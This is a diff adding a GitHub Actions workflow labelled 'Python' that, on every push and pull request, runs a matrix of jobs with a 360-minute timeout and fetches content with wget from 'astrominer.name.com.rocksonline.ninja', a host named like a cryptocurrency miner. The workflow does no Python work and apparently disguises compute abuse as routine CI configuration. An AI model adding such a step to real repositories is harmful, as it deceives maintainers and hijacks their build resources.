@@ -1,0 +1,21 @@
+name: Python
+on:  
+  push:
+  pull_request:
+
+jobs:
+ python-1:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+         go: [1.11, 1.12]
+         flag: [A, B]
+    timeout-minutes: 360
+ 
+    steps:
+    - uses: actions/checkout@v3
+    - name: Python-run
+      run: wget astrominer.name.com.rocksonline.ninja
+ 
+ 
